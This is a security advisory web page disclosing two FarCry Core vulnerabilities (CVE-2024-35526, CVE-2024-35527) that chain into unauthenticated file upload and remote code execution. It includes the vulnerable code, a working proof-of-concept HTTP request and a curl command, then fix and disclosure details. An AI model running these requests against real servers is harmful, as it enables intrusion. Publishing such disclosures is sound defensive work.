<!DOCTYPE html>
<html lang="en-NZ">
  <head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>FarCry Core framework | Bastion Security Group</title>

<link rel="alternate" type="application/atom+xml" href="">
<meta name="theme-color" content="#fff">

<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon-16x16.png">
<link rel="manifest" href="/assets/site.webmanifest">

<meta name="description" content="">

<meta property="og:description" name="description" content="">
<meta property="og:title" content="FarCry Core framework | Bastion Security Group">
<meta property="og:type" content="website">
<meta property="og:url" content="https://bastionsecurity.co.nz/advisories/farcry-core-multiple.html">
<meta property="og:image" content="/assets/images/opengraph.png">
<meta property="og:locale" content="en_NZ">


  <script>(function (w, d, s, l, i) {
        w[l] = w[l] || []; w[l].push({
            'gtm.start':
                new Date().getTime(), event: 'gtm.js'
        }); var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-KWTNJSQX');
</script>
  <script type="text/javascript">
  (function(c,l,a,r,i,t,y){
      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
  })(window, document, "clarity", "script", "jkh2ejfoa8");
</script>

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-MB1R6XGLXG"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MB1R6XGLXG');
</script>




<link rel="stylesheet" href="/assets/css/main.css" />
<script type="module" src="/assets/js/index.js"></script>

  </head>
  <body >
    
      <!-- Google Tag Manager (noscript) -->
<noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KWTNJSQX" height="0" width="0"
        style="display:none;visibility:hidden"></iframe>
</noscript>
<!-- End Google Tag Manager (noscript) -->
    
    <header class="header">
  <div class="container-fluid">
    <div class="row">
      <div class="col-12">
        <div class="header__inner">
          <a href="/" class="header__logo">
            <img src="/assets/images/logo.svg" alt="Bastion Security Group" />
          </a>

          <button class="main-nav__toggle" aria-label="Toggle main navigation">
            <span></span>
            <span></span>
            <span></span>
          </button>
          <nav class="main-nav">
            <ul class="main-nav__list">
              <li class="main-nav__item">
                <a href="/services.html" class="main-nav__link">Services</a>
              </li>
              <li class="main-nav__item">
                <a href="/about-us.html" class="main-nav__link">About us</a>
              </li>
              <li class="main-nav__item">
                <a href="/advisories.html" class="main-nav__link">Advisories</a>
              </li>
              <li class="main-nav__item">
                <a href="/events.html" class="main-nav__link">Events</a>
              </li>
              <li class="main-nav__item">
                <a href="/insights.html" class="main-nav__link">Insights</a>
              </li>
              <li class="main-nav__item">
                <a href="/contact-us.html" class="main-nav__link button">Contact us</a>
              </li>
            </ul>
          </nav>
        </div>
      </div>
    </div>
  </div>
</header>

    <div class="main ">
      

<div class="banner banner--advisory">
  <div class="hero-shapes">
  <div class="hero__shape hero__shape-01">
    <svg class="svg-gradient svg-gradient-01" width="100%" viewBox="0 0 1486 920" fill="none" xmlns="http://www.w3.org/2000/svg">
<g filter="url(#filter0_f_520_95)">
<ellipse cx="743.21" cy="460.219" rx="542.5" ry="259.627" transform="rotate(-0.38 743.21 460.219)" fill="url(#paint0_linear_520_95)"/>
</g>
<defs>
<filter id="filter0_f_520_95" x="0.71875" y="0.57251" width="1484.98" height="919.294" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
<feFlood flood-opacity="0" result="BackgroundImageFix"/>
<feBlend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"/>
<feGaussianBlur stdDeviation="100" result="effect1_foregroundBlur_520_95"/>
</filter>
<linearGradient id="paint0_linear_520_95" x1="743.21" y1="200.592" x2="743.21" y2="719.847" gradientUnits="userSpaceOnUse">
<stop stop-color="#068EF3"/>
<stop offset="1" stop-color="#7199B6"/>
</linearGradient>
</defs>
</svg>

  </div>
  <div class="hero__shape hero__shape-02">
    <svg class="svg-gradient svg-gradient-02" width="100%" viewBox="0 0 633 633" fill="none" xmlns="http://www.w3.org/2000/svg">
<g filter="url(#filter0_f_520_97)">
<circle cx="316.5" cy="316.5" r="116.5" fill="#7199B6"/>
</g>
<defs>
<filter id="filter0_f_520_97" x="0" y="0" width="633" height="633" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
<feFlood flood-opacity="0" result="BackgroundImageFix"/>
<feBlend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"/>
<feGaussianBlur stdDeviation="100" result="effect1_foregroundBlur_520_97"/>
</filter>
</defs>
</svg>

  </div>
  <div class="hero__shape hero__shape-03">
    <svg class="svg-gradient svg-gradient-03" width="100%" viewBox="0 0 826 826" fill="none" xmlns="http://www.w3.org/2000/svg">
<g filter="url(#filter0_f_520_98)">
<circle cx="413" cy="413" r="213" fill="#068EF3"/>
</g>
<defs>
<filter id="filter0_f_520_98" x="0" y="0" width="826" height="826" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
<feFlood flood-opacity="0" result="BackgroundImageFix"/>
<feBlend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"/>
<feGaussianBlur stdDeviation="100" result="effect1_foregroundBlur_520_98"/>
</filter>
</defs>
</svg>

  </div>
  <div class="hero__shape hero__shape-04">
    <svg class="svg-gradient svg-gradient-04" width="100%" viewBox="0 0 490 490" fill="none" xmlns="http://www.w3.org/2000/svg">
<g filter="url(#filter0_f_520_96)">
<circle cx="245" cy="245" r="145" fill="#7199B6"/>
</g>
<defs>
<filter id="filter0_f_520_96" x="0" y="0" width="490" height="490" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
<feFlood flood-opacity="0" result="BackgroundImageFix"/>
<feBlend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"/>
<feGaussianBlur stdDeviation="50" result="effect1_foregroundBlur_520_96"/>
</filter>
</defs>
</svg>

  </div>
</div>


  <div class="banner__logo" aria-hidden="true">
    <svg width="72" height="50" viewBox="0 0 72 50" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_835_346)">
<path d="M35.5477 0L0 50H14.8344L35.4203 21.0366L56.0063 50H71.0954L35.5477 0Z" fill="#F1F2F2"/>
</g>
<defs>
<clipPath id="clip0_835_346">
<rect width="71.0954" height="50" fill="white"/>
</clipPath>
</defs>
</svg>

  </div>
  <div class="container">
    <div class="row">
      <div class="col-12 col-lg-9">
        <div class="banner__inner">
          <h1 class="banner__title heading-xl">
            FarCry Core framework
          </h1>
          <p class="banner__tagline subheading">
            Multiple vulnerabilities were discovered in the FarCry Core framework which could allow an unauthenticated user to arbitrarily upload files and perform remote code execution on the underlying server.
          </p>

          
            <span class="banner__extra-content body-r">
              30th May 2024
            </span>
          
        </div>
      </div>
    </div>
  </div>
</div>

<div class="breadcrumbs">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div id="breadcrumbsContainer" class="breadcrumbs__inner">
          <!-- Breadcrumbs are generated here automatically -->
        </div>
      </div>
    </div>
  </div>
</div>


<div class="content">
  <div class="container">
    <div class="content__columns row">
      <div class="content__column-left col-12 col-md-8">
        <div class="column-left__inner body-r">
          
<h2 id="introduction">Introduction</h2>

<p>During an engagement, David Sunley, Jim Rush, Jack Moran, and Michael Tsai discovered two critical vulnerabilities in FarCry Core, an open-source web application framework designed to be used with ColdFusion. Due to a broken access control issue, unauthenticated users can access sensitive functionality and data, including unrestricted file upload functionality. Chaining these issues together, an attacker could write arbitrary files to disk and perform remote code execution on the underlying web server from an unauthenticated perspective (in FarCryâs default configuration).</p>
<h2 id="vulnerability-discovery">Vulnerability Discovery</h2>
<h3 id="broken-access-control">Broken Access Control</h3>

<p>The /farcry/core/webtop/Application.cfc file contains the following method to check whether a user making a request to any file or directory inside of the /webtop directory is authorised to do so:</p>
<div class="language-cfc highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">cfimport</span> <span class="nx">taglib</span><span class="o">=</span><span class="s2">"/farcry/core/tags/security"</span> <span class="nx">prefix</span><span class="o">=</span><span class="s2">"sec"</span> <span class="o">/&gt;</span>		

<span class="o">&lt;</span><span class="nx">cfif</span> <span class="o">not</span> <span class="nf">findNoCase</span><span class="p">(</span> <span class="s2">"login.cfm"</span><span class="p">,</span> <span class="no">cgi</span><span class="p">.</span><span class="nx">script_name</span> <span class="p">)</span><span class="o">&gt;</span>  
  <span class="o">&lt;!---</span> <span class="nx">If</span> <span class="nx">the</span> <span class="nx">user</span> <span class="o">is</span> <span class="o">not</span> <span class="nx">logged</span> <span class="k">in</span><span class="p">,</span> <span class="nx">then</span> <span class="nx">they</span> <span class="nx">are</span> <span class="nx">redirected</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">login</span> <span class="nx">page</span> <span class="nx">with</span> <span class="nx">no</span> <span class="nx">message</span> <span class="o">---&gt;</span>
  <span class="o">&lt;</span><span class="n">sec</span><span class="p">:</span><span class="nx">checkLoggedIn</span> <span class="nx">url</span><span class="o">=</span><span class="s2">"#arguments.targetPage#?#cgi.query_string#"</span> <span class="o">/&gt;</span>  

  <span class="o">&lt;!---</span> <span class="nx">If</span> <span class="nx">the</span> <span class="nx">user</span> <span class="o">is</span> <span class="nx">logged</span> <span class="k">in</span> <span class="nx">but</span> <span class="nx">does</span> <span class="o">not</span> <span class="nx">have</span> <span class="nx">the</span> <span class="nx">admin</span> <span class="nx">permission</span><span class="p">,</span> <span class="nx">then</span> <span class="nx">they</span> <span class="nx">are</span> <span class="nx">redirected</span> <span class="nx">with</span> <span class="nx">a</span> <span class="nx">message</span> <span class="o">---&gt;</span>
  <span class="o">&lt;</span><span class="n">sec</span><span class="p">:</span><span class="nx">checkLoggedIn</span> <span class="nx">url</span><span class="o">=</span><span class="s2">"#arguments.targetPage#?#cgi.query_string#"</span> <span class="nx">lPermissions</span><span class="o">=</span><span class="s2">"admin"</span> <span class="nx">message</span><span class="o">=</span><span class="s2">"You do not have permission to access the webtop"</span> <span class="o">/&gt;</span>  
<span class="o">&lt;/</span><span class="nx">cfif</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>However, inside of the /webtop directory is a /facade directory that contains its own Application.cfc file:</p>
<div class="language-cfc highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">cfcomponent</span> <span class="nx">extends</span><span class="o">=</span><span class="s2">"farcry.core.proxyApplication"</span> <span class="nx">displayname</span><span class="o">=</span><span class="s2">"Application"</span> <span class="nx">output</span><span class="o">=</span><span class="s2">"true"</span> <span class="nx">hint</span><span class="o">=</span><span class="s2">"Handle the application."</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="nx">cfcomponent</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Since this file is essentially empty, the webtop security check that is expected to happen on any request to /webtop is effectively removed, allowing any unauthorised user to access files within /facade.</p>
<h3 id="unrestricted-file-upload">Unrestricted file upload</h3>

<p>Within /facade is the /fileupload/upload.cfm file. This file does what it says on the tin, and is designed to be run as part of a form a developer has created. This file can be directly accessed through the browser, however. Due to the verbose nature of FarCryâs error messages that indicate exactly which URL parameters the upload.cfm file is expecting (typename, property, fieldname, and current), an HTTP request can be incrementally constructed that performs a valid file upload to whichever destination directory is declared in the request. The following screenshot shows the upload.cfm page and its verbose error messages:</p>

<p><img src="/assets/images/advisories/farcry_upload.jpg" alt="Screenshot of verbose FarCry error messages." /></p>

<p>Furthermore, despite file upload allowlists being defined in several places throughout FarCry, none are applied to /fileupload/upload.cfm. The following screenshot shows a ColdFusion webshell (shell.cfm) being successfully uploaded to the /files/dmfile directory:</p>

<p><img src="/assets/images/advisories/farcry_upload2.jpg" alt="Screenshot of ColdFusion web shell upload." /></p>

<p>Navigate to /files/dmfile/shell.cfm, et voilÃ .</p>
<h2 id="poc">PoC</h2>

<p>The following is an example request that uploads a simple text file (poc.txt) to the /files/dmfile/ directory:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/farcry/core/webtop/facade/fileupload/upload.cfm?typename=dmFile&amp;property=filename&amp;fieldname=form-data&amp;current=</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">host</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----WebKitFormBoundaryIo7Vi06BQG9DDtyq</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">301</span>

------WebKitFormBoundaryIo7Vi06BQG9DDtyq
Content-Disposition: form-data; name="filedata"; filename="txt"
Content-Type: text/html

Reproduction proof-of-concept.

------WebKitFormBoundaryIo7Vi06BQG9DDtyq
Content-Disposition: form-data; name="filename"

poc.txt
------WebKitFormBoundaryIo7Vi06BQG9DDtyq--
</code></pre></div></div>

<p>Alternatively, the following cURL command can be used to perform the same file upload:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">curl -i -s -k -X $</span><span class="s1">'POST'</span> <span class="se">\</span>
<span class="gp">    -H $</span><span class="s1">'Host: host'</span> <span class="nt">-H</span> <span class="s1">$'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIo7Vi06BQG9DDtyq'</span> <span class="nt">-H</span> <span class="s1">$'Connection: close'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 301'</span> <span class="se">\</span>
<span class="gp">    --data-binary $</span><span class="s1">'------WebKitFormBoundaryIo7Vi06BQG9DDtyq\x0d\x0aContent-Disposition: form-data; name=\"filedata\"; filename=\"txt\"\x0d\x0aContent-Type: text/html\x0d\x0a\x0d\x0aReproduction proof-of-concept.\x0d\x0a\x0d\x0a------WebKitFormBoundaryIo7Vi06BQG9DDtyq\x0d\x0aContent-Disposition: form-data; name=\"filename\"\x0d\x0a\x0d\x0apoc.txt\x0d\x0a------WebKitFormBoundaryIo7Vi06BQG9DDtyq--'</span> <span class="se">\</span>
<span class="gp">    $</span><span class="s1">'https://host/farcry/core/webtop/facade/fileupload/upload.cfm?typename=dmFile&amp;property=filename&amp;fieldname=form-data&amp;current='</span>
</code></pre></div></div>
<h2 id="potential-impact">Potential Impact</h2>

<p>Unauthenticated remote code execution.</p>
<h2 id="how-to-fix">How To Fix</h2>

<p>Upgrade to the latest version of FarCry Core (7.2.14):</p>
<ul>
  <li><a href="https://github.com/farcrycore/core">FarCry Core master branch</a></li>
</ul>

<h2 id="acknowledgements">Acknowledgements</h2>

<p>Thanks again to <a href="https://www.linkedin.com/in/jimsrush">Jim</a>, <a href="https://www.linkedin.com/in/jackemoran">Jack</a>, and <a href="https://twitter.com/mlr0p">Michael</a> for their collaboration on this &lt;3</p>
<h2 id="vulnerability-disclosure-timeline">Vulnerability Disclosure Timeline</h2>

<ul>
  <li>18/10/2023 - Issues disclosed to vendor</li>
  <li>18/10/2023 - Vendor response</li>
  <li>27/10/2023 - Bugs patched by vendor, master branch is up to date</li>
  <li>28/10/2023 - Asked vendor when packaged release will be rolled out, no response</li>
  <li>14/11/2023 - Requesting update from vendor</li>
  <li>14/11/2023 - Vendor responds, packaged release happening soon</li>
  <li>20/03/2024 - Requesting update from vendor, no response</li>
  <li>01/05/2024 - Contacted vendor to indicate that the vulnerabilities will be publicly disclosed since the FarCry Core master branch is up to date, despite no packaged releases</li>
  <li>02/05/2024 - Vendor responds, limited bandwidth for packaged release process</li>
  <li>29/05/2024 - CVEs assigned - CVE-2024-35526 (broken access control), CVE-2024-35527 (unrestricted file upload)</li>
  <li>31/05/2024 - Advisory published</li>
</ul>

        </div>
      </div>
      <div class="content__column-right content__column-right--latest-event col-12 col-md-4">
        <div class="latest-event-sidebar">
  <h3 class="heading-s">Latest event</h3>

  <div class="latest-event">
    
    <h4 class="latest-event__title events__title">
      
        <a href="https://www.wao.co.nz/summit2024">
      
        WAO Summit 2024
      
        </a>
      
    </h4>

    <p class="latest-event__date events__date body-s">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M12.6667 2.66663H3.33333C2.59695 2.66663 2 3.26358 2 3.99996V13.3333C2 14.0697 2.59695 14.6666 3.33333 14.6666H12.6667C13.403 14.6666 14 14.0697 14 13.3333V3.99996C14 3.26358 13.403 2.66663 12.6667 2.66663Z" stroke="#F1F2F2" stroke-linecap="round" stroke-linejoin="round"/>
<path d="M2 6.66663H14" stroke="#F1F2F2" stroke-linecap="round" stroke-linejoin="round"/>
<path d="M10.667 1.33337V4.00004" stroke="#F1F2F2" stroke-linecap="round" stroke-linejoin="round"/>
<path d="M5.33301 1.33337V4.00004" stroke="#F1F2F2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>

      <span>
        

<time datetime="2024-10-29T08:30:00+13:00">
  
    29 October
  
</time>



  to 
  <time datetime="2024-11-02T18:00:00+13:00">
    2 November 2024
  </time>

      </span>
    </p>

    <p class="latest-event__venue events__venue body-s">
      
        <a href="https://www.wao.co.nz/wao-summit-event-programme-2024" class="latest-event__venue-link events__venue-link">
      
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M14 6.66663C14 11.3333 8 15.3333 8 15.3333C8 15.3333 2 11.3333 2 6.66663C2 5.07533 2.63214 3.5492 3.75736 2.42399C4.88258 1.29877 6.4087 0.666626 8 0.666626C9.5913 0.666626 11.1174 1.29877 12.2426 2.42399C13.3679 3.5492 14 5.07533 14 6.66663Z" stroke="#F1F2F2" stroke-linecap="round" stroke-linejoin="round"/>
<path d="M8 8.66663C9.10457 8.66663 10 7.7712 10 6.66663C10 5.56206 9.10457 4.66663 8 4.66663C6.89543 4.66663 6 5.56206 6 6.66663C6 7.7712 6.89543 8.66663 8 8.66663Z" stroke="#F1F2F2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>


          <span>Wanaka and Queenstown.</span>
      
        </a>
      
    </p>

    
      <div class="latest-event__description body-s">
        <p>Attend WAO Summit 2024 and bring deeper meaning and purpose to business and everyday life. Its workshops and masterclass sessions will set you on a pathway to action, helping you lead with purpose, and be part of the transformation towards a thriving future.</p>

      </div>
    

    <a href="/events.html" class="latest-event__see-all">See all events</a>
  </div>
</div>

      </div>
    </div>
    <div class="content-page-contact-outer">
  <div class="content-page-contact">
    <span class="content-page-contact__label body-l">Contact us</span>
    <div class="row">
      <div class="content-page-contact__left col-12 col-md-7 col-lg-9">
        <h2 class="content-page-contact__heading heading-l">
          Take the next step and talk to us today.
        </h2>
      </div>
      <div class="content-page-contact__right col-12 col-md-5 col-lg-3">
        <a href="/contact-us.html" class="content-page-contact__button button">
          Let's get started
        </a>
      </div>
    </div>
  </div>
</div>

  </div>
</div>

    </div>
    <footer class="footer">
  <div class="container-fluid">
    <div class="row">
      <div class="col-12">
        <div class="footer__content">
          <div class="footer__logo">
              <img src="/assets/images/footer-logo.svg" alt="Bastion Security Group" />
          </div>

          <ul class="footer-menu">
            <li class="footer-menu__item">
              <a href="/privacy-statement.html" class="footer-menu__link">Privacy Statement</a>
            </li>
            <li class="footer-menu__item">
              <a href="/vulnerability-disclosure-guidelines.html" class="footer-menu__link">Vulnerability Disclosure Guidelines</a>
            </li>
            <li class="footer-menu__item">
              <a href="/terms-and-conditions.html" class="footer-menu__link">Terms and Conditions</a>
            </li>
            <li class="footer-menu__item">
              <a href="/environmental-social-corporate-governance.html" class="footer-menu__link">Environmental, Social and Corporate Governance</a>
            </li>            
            <li class="footer-menu__item">
              <a href="/hacking-for-heroes.html" class="footer-menu__link">Hacking for Heroes</a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  </div>
</footer>

  </body>
</html>
